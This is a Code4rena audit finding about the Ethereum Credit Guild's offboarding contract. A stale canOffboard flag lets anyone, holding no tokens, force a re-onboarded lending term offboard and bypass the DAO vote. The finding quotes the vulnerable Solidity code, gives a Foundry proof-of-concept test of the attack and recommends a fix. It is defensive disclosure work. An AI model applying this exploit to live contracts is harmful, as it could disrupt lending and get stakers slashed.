# Original link
https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/1147
# Lines of code

https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/LendingTermOffboarding.sol#L138-L140
https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/LendingTermOffboarding.sol#L154
https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/LendingTermOffboarding.sol#L177-L180
https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/loan/LendingTerm.sol#L797
https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/loan/SurplusGuildMinter.sol#L228-L231


# Vulnerability details

The `LendingTermOffboarding` contract allows guild holders to poll to remove a lending term. If the voting weight is enough, the lending term can be offboarded without delay. Further, the offboarded term can be re-onboarded to become an active term through the `LendingTermOnboarding::proposeOnboard()` following up with the voting mechanism.

The following briefly describes the steps for offboarding the lending term through the `LendingTermOffboarding` contract:
1. Anyone executes the `proposeOffboard()` to create a poll for offboarding the term. The poll has an age of ~7 days.
2. Guild holders cast votes for offboarding the term via `supportOffboard()`.
3. If the poll has not ended and the voting weight is enough, the `canOffboard[term]` flag will be set.
4. If the `canOffboard[term]` flag is set; anyone can execute the `offboard()` to offboard the term.
5. All loans of the offboarded term have to be called and closed.
6. After all loans have been closed, the `cleanup()` can be invoked to explicitly terminate the term and reset the `canOffboard[term]` flag.

The following roughly describes the steps for re-onboarding the offboarded lending term through the `LendingTermOnboarding` contract:
1. The offboarded term can be proposed for re-onboarding through the `proposeOnboard()`.
2. Guild holders cast votes for the term.
3. If the vote is successful, the term re-onboarding operation is queued in the Timelock.
4. After the Timelock delay, the term can be re-onboarded to become an active lending term again.

## Vulnerability Details

This report describes the vulnerability in the `LendingTermOffboarding` contract, allowing an attacker to force the re-onboarded lending term to offboard by overriding the DAO vote offboarding mechanism. In other words, the attacker is not required to create an offboarding poll and wait for the vote to succeed in offboarding the target term. Furthermore, the attacker is not required to possess any guild tokens.

The following explains the attack steps:
1. As per steps 1 - 4 for offboarding the lending term previously described above, the [`canOffboard[term]` flag will be set](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/LendingTermOffboarding.sol#L138-L140) by the `supportOffboard()`, and the [lending term will be offboarded](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/LendingTermOffboarding.sol#L154) via the `offboard()`.
2. To explicitly terminate the term (via the `cleanup()`), all loans issued must be [called and closed](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/LendingTermOffboarding.sol#L177-L180). Therefore, there will be a time gap waiting for all loans to be closed in this step.
3. Assuming that while waiting for all loans to be closed, the offboarded term has been proposed and successfully granted for re-onboarding (see steps 1 - 4 previously described above for re-onboarding the offboarded lending term).
4. After the previous step, the term has become re-onboarded (active) for issuing new loans. Notice that the term was re-onboarded without executing the `cleanup()`. Thus, the `canOffboard[term]` flag is still active.
5. For this reason, the attacker can [execute the `offboard()`](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/LendingTermOffboarding.sol#L154) to force offboarding the re-onboarded term, overriding the DAO vote offboarding mechanism (since the `canOffboard[term]` flag is still active).

The attacker can suddenly offboard the re-onboarded term whenever they will, regardless of how long the target term has been re-onboarded, how long the offboarding poll has expired, or how long the `canOffboard[term]` flag has been activated (please refer to the `Proof of Concept` section for the coded PoC).

Furthermore, the attacker does not need to hold guild tokens to exploit this vulnerability.

```solidity
    function supportOffboard(
        uint256 snapshotBlock,
        address term
    ) external whenNotPaused {
        require(
            block.number <= snapshotBlock + POLL_DURATION_BLOCKS,
            "LendingTermOffboarding: poll expired"
        );
        uint256 _weight = polls[snapshotBlock][term];
        require(_weight != 0, "LendingTermOffboarding: poll not found");
        uint256 userWeight = GuildToken(guildToken).getPastVotes(
            msg.sender,
            snapshotBlock
        );
        require(userWeight != 0, "LendingTermOffboarding: zero weight");
        require(
            userPollVotes[msg.sender][snapshotBlock][term] == 0,
            "LendingTermOffboarding: already voted"
        );

        userPollVotes[msg.sender][snapshotBlock][term] = userWeight;
        polls[snapshotBlock][term] = _weight + userWeight;
@1      if (_weight + userWeight >= quorum) {
@1          canOffboard[term] = true; //@audit -- Once the voting weight is enough, the canOffboard[term] flag will be set
@1      }
        emit OffboardSupport(
            block.timestamp,
            term,
            snapshotBlock,
            msg.sender,
            userWeight
        );
    }

    function offboard(address term) external whenNotPaused {
@2      require(canOffboard[term], "LendingTermOffboarding: quorum not met"); //@audit -- If the canOffboard[term] flag is set, the term can be offboarded

        // update protocol config
        // this will revert if the term has already been offboarded
        // through another mean.
        GuildToken(guildToken).removeGauge(term);

        // pause psm redemptions
        if (
            nOffboardingsInProgress++ == 0 &&
            !SimplePSM(psm).redemptionsPaused()
        ) {
            SimplePSM(psm).setRedemptionsPaused(true);
        }

        emit Offboard(block.timestamp, term);
    }

    function cleanup(address term) external whenNotPaused {
        require(canOffboard[term], "LendingTermOffboarding: quorum not met");
@3      require(
@3          LendingTerm(term).issuance() == 0, //@audit -- To clean up the term, all its loans must be closed
@3          "LendingTermOffboarding: not all loans closed"
@3      );
        require(
            GuildToken(guildToken).isDeprecatedGauge(term),
            "LendingTermOffboarding: re-onboarded"
        );

        // update protocol config
        core().revokeRole(CoreRoles.RATE_LIMITED_CREDIT_MINTER, term);
        core().revokeRole(CoreRoles.GAUGE_PNL_NOTIFIER, term);

        // unpause psm redemptions
        if (
            --nOffboardingsInProgress == 0 && SimplePSM(psm).redemptionsPaused()
        ) {
            SimplePSM(psm).setRedemptionsPaused(false);
        }

        canOffboard[term] = false;
        emit Cleanup(block.timestamp, term);
    }
```

- `@1 -- Once the voting weight is enough, the canOffboard[term] flag will be set`: https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/LendingTermOffboarding.sol#L138-L140

- `@2 -- If the canOffboard[term] flag is set, the term can be offboarded`: https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/LendingTermOffboarding.sol#L154

- `@3 -- To clean up the term, all its loans must be closed`: https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/LendingTermOffboarding.sol#L177-L180

## Impact

The active re-onboarded lending term can be forced to immediately offboard, bypassing the DAO vote offboarding, which is the protocol's core mechanism. Subsequently, the attacked lending term will block all new loans from being issued and prevent guild holders from voting for the term. 

**Moreover, all loans previously issued by the attacked term can be called putting the loans for bidding silently (since the attacker bypasses the DAO vote offboarding mechanism). If one of the loans fails on bidding to fill up the loan's principal, the [term's loss will be notified](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/loan/LendingTerm.sol#L797). As a result, all users who stake credit tokens through the `SurplusGuildMinter` contract to vote for the attacked term will [be slashed with all their credit principal and guild rewards](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/loan/SurplusGuildMinter.sol#L228-L231).**

## Proof of Concept

This section provides a coded PoC. 

Place the `testPoCReplayOffboarding()` in the `.test/unit/governance/LendingTermOffboarding.t.sol` file and run the test using the `forge test --match-test testPoCReplayOffboarding -vvv` command.

The PoC explains the attack steps described in the `Vulnerability Details` section.

```solidity
function testPoCReplayOffboarding() public {
    // Prepare for Bob
    guild.mint(bob, _QUORUM);
    vm.startPrank(bob);
    guild.delegate(bob);

    uint256 POLL_DURATION_BLOCKS = offboarder.POLL_DURATION_BLOCKS();
    uint256 snapshotBlock = block.number;
    uint256 OFFBOARDING_POLL_END_BLOCK = snapshotBlock + POLL_DURATION_BLOCKS;

    // Bob proposes an offboarding of the term
    assertEq(guild.isGauge(address(term)), true);
    offboarder.proposeOffboard(address(term));

    // Next 1 day
    vm.roll(block.number + 6646); // 1 day
    vm.warp(block.timestamp + 6646 * 13);
    assertLe(block.number, OFFBOARDING_POLL_END_BLOCK);

    vm.expectRevert("LendingTermOffboarding: quorum not met");
    offboarder.cleanup(address(term));

    // Bob votes for offboarding the term and executes the offboarding (he has a sufficient voting weight)
    assertEq(guild.isGauge(address(term)), true);
    assertEq(offboarder.canOffboard(address(term)), false);
    offboarder.supportOffboard(snapshotBlock, address(term));
    offboarder.offboard(address(term));
    assertEq(guild.isGauge(address(term)), false);
    assertEq(offboarder.canOffboard(address(term)), true);

    // Cannot clean up because loans are active
    vm.expectRevert("LendingTermOffboarding: not all loans closed");
    offboarder.cleanup(address(term));

    // ------------------------------------------------------------------------------ //
    // ---<< Waiting for all term's loans to be closed to execute the cleanup() >>--- //
    // ------------------------------------------------------------------------------ //

    // Next 10 days
    // Offboarding poll expired
    vm.roll(block.number + 66460); // 10 days
    vm.warp(block.timestamp + 66460 * 13);
    assertGt(block.number, OFFBOARDING_POLL_END_BLOCK);

    // While waiting for all term's loans to be closed, the term gets re-onboarded
    vm.stopPrank();
    assertEq(guild.isGauge(address(term)), false);
    guild.addGauge(1, address(term));
    assertEq(guild.isGauge(address(term)), true);

    // The canOffboard[term] flag is still active since the cleanup() hasn't been called
    assertEq(offboarder.canOffboard(address(term)), true);

    // Next 30 days
    vm.roll(block.number + 199380); // 30 days
    vm.warp(block.timestamp + 199380 * 13);

    // Attacker offboards the term by overriding the DAO vote offboarding mechanism
    // The attacker did not need to hold any guild tokens to exploit this vulnerability
    address Attacker = address(1);
    vm.startPrank(Attacker);
    assertEq(guild.isGauge(address(term)), true);
    offboarder.offboard(address(term));
    assertEq(guild.isGauge(address(term)), false);
}
```

## Tools Used

Manual Review

## Recommended Mitigation Steps

Implement a proper mechanism for resetting the `canOffboard[term]` flag once the associated lending term has been re-onboarded. 

*It is worth noting that the `canOffboard[term]` flag should be reset after the term re-onboarding operation has successfully been executed by Timelock (when the term is already active) to prevent other security issues.*


## Assessed type

Other